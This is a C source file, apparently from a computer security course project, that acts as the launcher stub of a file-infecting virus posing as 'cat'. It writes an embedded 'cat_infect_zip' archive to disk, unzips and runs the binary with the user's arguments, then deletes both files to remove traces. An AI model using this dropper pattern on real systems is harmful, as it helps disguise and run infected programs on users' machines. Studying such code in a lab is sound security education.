// xxd the tool use to see binary file
// xxd cat | tail -n 1 to see last 4 bytes
// https://blog.kalan.dev/2020-03-28-xxd-%E7%B0%A1%E6%98%93%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F%E7%B4%80%E9%8C%84/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include "cat.h" 

int main(int argc, char *argv[]){
    // system("zip target target");
    // FILE *fptr;
    // fptr = fopen("./target.zip", "rb");
    // // fptr = fopen("./1.txt", "rb");
    // char content[2645];
    // fread(content, 2644, 1, fptr);
    // fclose(fptr);
    // // printf("%s",content);
    // // for(int i = 0; i < 2644; i++){
    // //     printf("%02hhx", content[i]);
    // //     if(i%2 == 1)printf(" ");
    // //     if(i % 16 == 15){
    // //         printf("\n");
    // //     }
    // // }
    // fptr = fopen("./compress.zip", "wb");
    // fwrite(content, 2644, 1, fptr);
    
    // // system("rm target.zip");

    // create temp .zip file, uncompress it and execute it with argv argc
    FILE *fptr;
    fptr = fopen("./compression.zip", "wb");
    fwrite(cat_infect_zip, cat_infect_zip_len, 1, fptr);
    fclose(fptr);
    system("unzip compression.zip");
    pid_t pid;
    pid = fork();
    if(pid == 0){
        // child
        // execute cat
        char a[] = "cat";
        argv[0] = a;
        // for(int i = 0; i < argc; i++){
        //     printf("%s\n", argv[i]);
        // }
        // absolutely path
        int outcome = execvp("/home/wc/computer_security/ComputerSecurity/project3/task2/cat", argv);
        if(outcome == -1)printf("error in execvp\n");
    }
    else{
        //parent
        int status;
        waitpid(pid, &status, 0);
        system("rm compression.zip");
        system("rm cat");
    }

}